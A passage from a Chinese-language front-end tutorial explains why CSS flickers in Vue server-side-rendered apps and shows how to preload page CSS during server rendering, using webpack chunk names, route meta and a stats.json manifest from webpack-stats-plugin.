这种文件名是由一串随机哈希组成的文件，我们将其称为『随机命名子包』。</p><p>通常这两种包是存在依赖关系的，随机命名子包其实就是从命名子包中拆分出来的代码，或者是多个命名子包共用的某一部分代码，依赖关系示例如下：</p><p><img src="https://s2.loli.net/2023/06/06/mwkFKRT7cilXpYb.png" alt=""></p><p>当我们打包好一个 Vue 应用之后，假设 chunk 之间的依赖关系如上图所示，打包好的 HTML 会按顺序内联入如下几个 js 和 css：</p><ul><li>runtimechunk~main.js</li><li>73e9df.js</li><li>29fe22.js</li><li>mian.js</li><li>main.css</li></ul><p><code>mian.js</code> 被内联入 HTML 的原因是因为其是当前 Vue 应用的入口文件，不论用户访问哪个页面都会加载，因此必须被内联到 HTML 中；<code>73e9df.js</code>、<code>29fe22.js</code> 这两个文件被内联入 HTML 的原因是因为他们属于 <code>main.js</code> 的依赖 chunk，vue 相关的代码就很可能被打包到这两个子包中，<code>main.js</code> 如果想要正常运行就必须要先加载这两个包；<code>main.css</code> 被内联到 HTML 的原因是因为 <code>main.js</code> 中引用了一些 css，这些 css 也会被视作应用加载的必要加载项。</p><p>最特殊的是 <code>runtimechunk~main.js</code> 这个文件，这个文件的加载优先级是最高的，然而这个文件其实既不属于具名子包，也不属于随机命名子包，它的作用更像是一份清单文件，记录了具名子包与随机命名子包之间的关系，并包含了一些运行时代码，得以能够成功加载出当前页面所需要的静态资源文件。</p><p>举例来说，chunk 之间的依赖关系仍用上图表示，当用户访问了这个 Vue 应用的首页，并且当前项目的 vue-router 使用了路由懒加载，其路由声明如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">HomePage</span> = (<span class="params"></span>) =&gt; <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;home-page&quot; */</span> <span class="string">&#x27;./views/HomePage.vue&#x27;</span>) <span class="comment">// 会生成 home-page.js 这个子包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">routes</span>: [&#123; <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>, <span class="attr">component</span>: <span class="title class_">HomePage</span> &#125;],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当浏览器访问当前页面后，首先会下载所有的内联资源，这些内联资源的 script 标签被设置为 <code>defer</code>，也就是不会阻塞页面的渲染，此时浏览器会在现在这些资源的同时将 SSR 渲染得出的 HTML 页面直接渲染到浏览器中，这时用户将看到一个只包含了部分样式的页面（部分样式指的是 main.css 中包含的样式），如下：</p><p><img src="https://s2.loli.net/2023/06/06/gWZweErqaxvG3FL.png" alt=""></p><p>当内联资源下载完成后会率先运行 <code>runtimechunk~main.js</code> 文件，runtimechunk 的运行时代码就会协调加载并运行 <code>main.js</code> 及其依赖。当 <code>mian.js</code> 执行到 vue-router 中的代码时，就会去加载 HomePage 组件的代码，此时会根据 runtimechunk 中的代码清单查询到需要加载 home-page.js 文件，此外还会查询 home-page.js 文件的依赖 chunk，并找到 22e9df.js、79fe223.js、2312e2.js 这些 js 文件以及 22e9df.css、79fe223.css、2312e2.css、home-page.css 这些 css 文件，为这些文件生成 script 和 link 标签，将其使用 <code>appendChild</code> 的方式添到 HTML 的 head 中并进行加载（js 文件加载完成后会自动移除掉 script 标签，而 link 标签是不会被移除的）。</p><p>直到此时，当浏览器将 22e9df.css、79fe223.css、2312e2.css、home-page.css 这几个首页相关的 css 文件成功下载下来之后，首页的样式才会被完全加载。这个过程是很明显会被用户刚知道的，这也就是 SSR 项目中样式闪烁问题存在的原因。</p><h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><p>经过上面的分析，我们不难发现样式闪烁的原因就是因为在页面没有加载首页样式前就已经渲染了 HTML，那么我们解决问题的思路就是要在服务端渲染时将服务端渲染的 HTML 中内联入当前页面所需要的 CSS 文件，这样在 HTML 渲染到页面前，会被内联的 CSS 阻塞，必须等待 CSS 加载成功后才能进行渲染，而此时渲染出的就是一个有了样式的页面。</p><p>那么难点来了，当用户访问某个页面时，我们如何在服务端渲染时就得知当前页面所需的 CSS 文件呢？</p><h2 id="简单推断"><a href="#简单推断" class="headerlink" title="简单推断"></a>简单推断</h2><p>我们先来简单推断一下，首先我们不需要管 <code>main.css</code>，因为其已经内联到模板 HTML 中了，那么假如用户访问了网站首页，因为我们用了 webpack 的 Magic Comments，可以得知首页组件的 JS 代码是打包在 <code>home-page.js</code> 中的，那么对应的，首页相关的 CSS 代码是打包在 <code>home-page.css</code> 这个具名子包中的，因此我们可以简单的写一个判断：当用户访问首页路由的时候，在返回给客户端的 HTML 中为其添加一个 link 标签，让其加载 <code>home-page.css</code>，代码示例如下：</p><p>HTML 模板：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    &lt;%= htmlWebpackPlugin.tags.headTags %&gt;</span><br><span class="line">    <span class="comment">&lt;!-- preload-links --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="comment">&lt;!-- app-html --&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>路由：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// router.js</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="attr">component</span>: <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;layout&quot; */</span> <span class="string">&#x27;./components/layout/index.vue&#x27;</span>),</span><br><span class="line"><span class="attr">meta</span>: &#123;</span><br><span class="line"><span class="comment">// 在此指定一下当前组件打包的 chunkName</span></span><br><span class="line"><span class="attr">chunkName</span>: <span class="string">&#x27;layout&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">children</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>: <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;home-page&quot; */</span> <span class="string">&#x27;./views/HomePage.vue&#x27;</span>),</span><br><span class="line"><span class="attr">meta</span>: &#123;</span><br><span class="line"><span class="attr">chunkName</span>: <span class="string">&#x27;home-page&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">]</span><br><span class="line">  &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>服务端渲染逻辑（简化版）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entry.server.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;createSSRApp <span class="keyword">as</span> createApp, renderToString&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">createSSRApp</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>();</span><br><span class="line">app.<span class="title function_">use</span>(router);</span><br><span class="line"><span class="keyword">await</span> router.<span class="title function_">isReady</span>();</span><br><span class="line"><span class="keyword">const</span> appContent = <span class="keyword">await</span> <span class="title function_">renderToString</span>(app);</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">appContent,</span><br><span class="line">router,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; appContent, router &#125; = <span class="title function_">createSSRApp</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断当前页面应该加载的 js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPreloadLinkByChunkNames</span>(<span class="params">chunkNames</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PUBLIC_PATH</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CSS_ASSET_PATH</span> = <span class="string">&#x27;assets/css/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> cssAssets = chunkNames.<span class="title function_">map</span>(</span><br><span class="line"><span class="function"><span class="params">name</span> =&gt;</span> <span class="string">`<span class="subst">$&#123;PUBLIC_PATH&#125;</span><span class="subst">$&#123;CSS_ASSET_PATH&#125;</span>name.css`</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> links = cssAssets.<span class="title function_">map</span>(<span class="function"><span class="params">asset</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(assets.<span class="title function_">endsWith</span>(<span class="string">&#x27;.css&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// preload 能够使页面更快的加载 css 资源</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">`&lt;link rel=&quot;preload&quot; as=&quot;style&quot; href=&quot;<span class="subst">$&#123;file&#125;</span>&quot; &gt;`</span></span><br><span class="line">+ <span class="string">`&lt;link rel=&quot;stylesheet&quot; as=&quot;style&quot; href=&quot;<span class="subst">$&#123;file&#125;</span>&quot;&gt;`</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> links.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据路由的 meta 获取当前页面的具名 chunk</span></span><br><span class="line"><span class="comment"> * 比如当用户访问 `/home` 页面，根据上面路由的定义</span></span><br><span class="line"><span class="comment"> * currentPageChunkNames 得到的值就是 [&#x27;layout&#x27;, &#x27;home-page&#x27;]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> currentPageChunkNames = router.<span class="property">currentRoute</span>.<span class="property">value</span>.<span class="property">matched</span>.<span class="title function_">map</span>(</span><br><span class="line"><span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">meta</span>?.<span class="property">chunkName</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> preloadLinks = <span class="title function_">getPreloadLinkByChunkNames</span>(currentPageChunkNames);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取模板</span></span><br><span class="line"><span class="keyword">const</span> template = fs.<span class="title function_">readFileSync</span>(<span class="comment">/** ... ... */</span>)</span><br><span class="line"><span class="keyword">const</span> html = template.<span class="title function_">toString</span>()</span><br><span class="line">.<span class="title function_">replate</span>(<span class="string">&#x27;&lt;!-- preload-links --&gt;&#x27;</span>, $&#123;preloadLinks&#125;)</span><br><span class="line">.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;!-- app-html --&gt;&#x27;</span>, <span class="string">`<span class="subst">$&#123;appContent&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// 向客户端发送渲染出的 html</span></span><br><span class="line">res.<span class="title function_">send</span>(html)</span><br></pre></td></tr></table></figure><p>这样，当浏览器拿到服务端渲染出的 HTML，就可以加载出来首页『主要』的 CSS 了，我们可以看下现在的效果 ：</p><p><img src="https://s2.loli.net/2023/06/06/o1ZEpsXeYlrfT4b.png" alt=""></p><p>之所以说『主要』 的 CSS 已经加载出来了，那么就肯定有部分『次要』的 CSS 没有加载出来，那么这一部分 CSS 为什么没有加载出来呢？</p><h2 id="加载完整的-CSS"><a href="#加载完整的-CSS" class="headerlink" title="加载完整的 CSS"></a>加载完整的 CSS</h2><p>也许你已经发现了，到目前为止，我们仅仅把『具名子包』的 CSS 引入仅了服务端渲染出的 HTML 中，但是『具名子包』所依赖的『随机命名子包』我们还没有内联进去，而这些『随机命名子包』中的样式可能是某些公共组件的通用样式，亦或者是你使用的第三方组件库的样式，这些样式因为可能被多个页面引用到，所以 webpack 会将其拆分成多个子包，让多个页面都引用同一个子包。</p><p>到这里我们似乎遇到了一个难点，那就是如何获取到这些命名没有规律且有可能被其他页面共享的『随机命名子包』。</p><p>还记得前面提到的 runtimechunk 吗？既然 webpack 可以生成 runtimechunk 来记录每个子包之间的依赖关系，那么是否有一种方法可以在服务端渲染时候获取到这个关系，即当我们知道了当前页面加载的具名子包是 <code>home-page</code>，顺着这个依赖关系，我们就可以找到 <code>22e9df.css</code> 和 <code>79fe223.css</code> 这两个被拆分为随机命名子包的样式。</p><p><a href="https://www.npmjs.com/package/webpack-stats-plugin">webpack-stats-plugin</a> 就提供了这样的能力，利用这个 webpack 插件，通过合理的配置我们可以生成一个 <code>stats.json</code> 这个文件记录了所有的具名子包（namedChunk）以及这些具名子包的依赖，这样就解决了我们上面遇到的难题。</p><p>在 webpack 中写入配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"><span class="attr">target</span>: <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line"><span class="attr">entry</span>: <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line"><span class="attr">output</span>: &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">module</span>: &#123;</span><br><span class="line"><span class="attr">rules</span>: [</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">StatsWriterPlugin</span>(&#123;</span><br><span class="line">            <span class="attr">filename</span>: <span class="string">&#x27;stats.json&#x27;</span>,</span><br><span class="line">            <span class="attr">fields</span>: [<span class="string">&#x27;publicPath&#x27;</span>, <span class="string">&#x27;namedChunkGroups&#x27;</span>],</span><br><span class="line">        &#125;),</span><br><span class="line">],</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>fields</code> 可以支持 <code>[&quot;errors&quot;, &quot;warnings&quot;, &quot;assets&quot;, &quot;hash&quot;, &quot;publicPath&quot;, &quot;namedChunkGroups&quot;]</code>，更多配置可以查看 <a href="https://github.com/FormidableLabs/webpack-stats-plugin/blob/main/test/scenarios/webpack5/webpack.config.js">官方示例</a></p></blockquote><p>之后会在编译的产出目录下生成一个 <code>stats.json</code> 文件，其内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;publicPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;namedChunkGroups&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;chunks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="number">3213</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">122</span><span class="punctuation">,</span></span><br><span class="line"><span class="number">333</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;asstes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/runtimechunk~main.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/73e9df.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/css/main.xxx.css&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/29fe22.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;filteredAssets&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;assetsSize&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;auxiliaryAssets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;filteredAuxiliaryAssets&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;auxiliaryAssetsSize&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;children&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;childAssets&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isOverSizeLimit&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;layout&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;chunks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;asstes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/2312e2.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/css/3490e1.xxx.css&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/3490e1.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/css/ef2312.xxx.css&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/ef2312.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/css/layout.xxx.css&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assets/js/29fe22.xxx.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;home-page&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;home-page&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;chunks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;asstes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如上， <code>stats.json</code> 生成的就是各个『具名子包』与其『随机命名子包』的依赖关系。在上一章节的简单推断中，我们可以通过 webpack 的 Magic Comments 为每个页面生成具名子包，然后通过路由的 meta 信息来推断出当前页面会引用到哪些『具名子包』，那么在服务端渲染时，我们就可以通过 <code>stats.json</code> 文件将已知的『具名子包』作为条件，推断出所有的『随机命名子包』。然后我们将所有的静态资源进行拼接，就可以无需等待 runtimechunk 和入口文件的执行，直接预加载好静态资源了，不仅能在首屏就渲染出样式，在一定程度上也能提升前端页面性能指标中的 <code>SI</code> 与 <code>TTI</code> 指标。</p><p>结合 <code>stats.json</code> 在服务端渲染时提前拼接出资源标签的代码实例实现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; appContent, router &#125; = <span class="title function_">createSSRApp</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 